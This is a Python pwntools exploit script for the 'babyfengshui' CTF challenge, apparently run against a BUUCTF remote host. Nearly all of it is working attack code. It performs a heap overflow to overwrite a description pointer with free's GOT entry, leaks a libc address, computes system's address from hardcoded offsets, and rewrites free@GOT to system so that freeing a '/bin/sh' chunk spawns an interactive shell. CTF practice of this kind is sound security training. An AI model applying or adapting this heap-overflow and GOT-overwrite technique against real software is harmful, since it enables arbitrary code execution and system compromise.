# coding:utf-8
from ctypes import LibraryLoader
from pwn import *
# from LibcSearcher import *
context.log_level = 'debug'

proc_name = 'babyfengshui_33c3_2016'
islocal = 0
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
# libc = ELF('/home/klose/ctf/pwn/file/buuctf/babyfengshui_33c3_2016/libc6_2.23_i386.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 28217)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def add(size, name, text_size, text):
    p.sendlineafter("Action: ", '0')
    p.sendlineafter("size of description: ", str(size))
    p.sendlineafter("name: ", name)
    p.sendlineafter("text length: ", str(text_size))
    p.sendlineafter("text: ", text)

def delete(idx):
    p.sendlineafter("Action: ", '1')
    p.sendlineafter("index: ", str(idx))

def display(idx):
    p.sendlineafter("Action: ", '2')
    p.sendlineafter("index: ", str(idx))

def update(idx, text_size, text):
    p.sendlineafter("Action: ", '3')
    p.sendlineafter("index: ", str(idx))
    p.sendlineafter("text length: ", str(text_size))
    p.sendlineafter("text: ", text)

def exit():
    p.sendlineafter("Action: ", '4')

def chunk_set():
    add(0x80, 'name1', 0x80, 'description1')
    # debug(0)
    add(0x80, 'name2', 0x80, 'description2')
    # debug(0)
    add(0x08, 'name3', 0x08, '/bin/sh\x00')
    # debug(0)
    delete(0)
    # debug(0)

def libc_leak():
    global system_addr
    payload  = 'a' * 0x198
    payload += p32(elf.got['free'])
    add(0x100, 'name4', 0x19c, payload)
    # debug(0)
    display(1)
    # debug(0)

    p.recvuntil('description: ')
    free_addr = u32(p.recv(4))
    libc_base = free_addr - 0x070750
    system_addr = libc_base + 0x03a940
    # libc = LibcSearcher('free', free_addr)
    # libc_base = free_addr - libc.dump('free')
    # system_addr = libc_base + libc.dump('system')

    log.success('free_addr => ' + hex(free_addr))
    log.success('libc_base => ' + hex(libc_base))
    log.success('system_addr => ' + hex(system_addr))

def pwn():
    update(1, 0x4, p32(system_addr))
    # debug(0)
    delete(2)
    # debug(0)

    p.interactive()

if __name__ == '__main__':
    chunk_set()
    libc_leak()
    pwn()


